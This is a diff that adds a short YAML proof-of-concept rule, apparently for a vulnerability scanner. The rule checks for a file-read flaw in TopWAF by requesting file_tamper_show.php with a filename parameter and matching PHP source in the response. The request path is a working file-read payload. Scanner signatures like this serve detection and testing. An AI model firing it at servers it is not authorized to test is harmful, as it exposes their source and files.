@@ -1,0 +1,11 @@
+name: poc-yaml-topwaf-fileread
+rules:
+  - method: GET
+    path: /function/content/tamper/file_tamper_show.php?filename=file_tamper_show.php
+    follow_redirects: false
+    expression: |
+      response.status == 200 && response.body.bcontains(bytes(string("<title>查看源码</title>"))) && response.body.bcontains(bytes(string("&lt;?php")))
+detail:
+  author: liberty
+  links:
+    - https://www.onebug.org/wooyundata/55490.html
